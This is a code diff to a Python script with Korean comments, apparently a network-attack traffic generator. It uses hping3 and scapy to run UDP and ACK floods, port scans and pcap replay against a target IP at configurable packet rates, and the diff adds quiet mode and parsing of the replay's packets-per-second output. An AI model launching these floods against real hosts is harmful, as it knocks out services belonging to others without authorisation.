@@ -7,6 +7,7 @@ import os
 from attack_intensity import *
 from scapy.all import *
 from scapy.utils import rdpcap
+import re
 
 
 # ARP Scan을 사용 - 가장 빠르게 스캔이 가능하며, 포트 번호가 필요치 않음
@@ -39,11 +40,13 @@ def tcp_replay(pcap_file, loop=1):
     log('Mid', attack_command)
     p = subprocess.Popen(attack_command_list_form, stdout=subprocess.PIPE, preexec_fn=os.setsid)
     outs, errs = p.communicate()
+
+    pps=re.findall("(\d+.\d+) pps", outs.decode("utf-8"))
+    
     p.kill()
-    print(outs)
-    print(errs)
 
     log('End', attack_type='TCP replay')
+    return pps[0]
 
 # Stealth Scan을 사용
 def port_scanning(target_ip, intensity):
@@ -144,9 +147,9 @@ def udp_flood(dstIP, dstPort_type, pps, count):
 
     interval_us = round(10**6/pps)    # microseconds
     if dstPort_type == 1:
-        attack_command = f'sudo hping3 {dstIP} -2 -i u{interval_us} -p {dstPort} -c {count} -d {byte}'  # + ' --rand-source'
+        attack_command = f'sudo hping3 {dstIP} -2 -i u{interval_us} -p {dstPort} -c {count} -d {byte} -q'  # + ' --rand-source'
     elif dstPort_type == 2:
-        attack_command = f'sudo hping3 {dstIP} -2 -i u{interval_us} -p ++1 -c {count} -d {byte}'  # + ' --rand-source'
+        attack_command = f'sudo hping3 {dstIP} -2 -i u{interval_us} -p ++1 -c {count} -d {byte} -q'  # + ' --rand-source'
 
     print(attack_command)
     attack_command_list_form = attack_command.split(' ')
@@ -176,7 +179,7 @@ def ack_flood(dstIP, dstPort, pps, count):
     print('[ACK Flooding]')
     log('Start', attack_type='ACK Flooding', param_info={'port': dstPort, 'pps': pps, 'count': count})
     interval_us = round(10**6/pps)    # microseconds
-    attack_command = f'sudo hping3 {dstIP} -i u{interval_us} -A -p {dstPort} -c {count}'  # + ' --rand-source'
+    attack_command = f'sudo hping3 {dstIP} -i u{interval_us} -A -p {dstPort} -c {count} -q'  # + ' --rand-source'
     attack_command_list_form = attack_command.split(' ')
 
     log('Mid', attack_command)
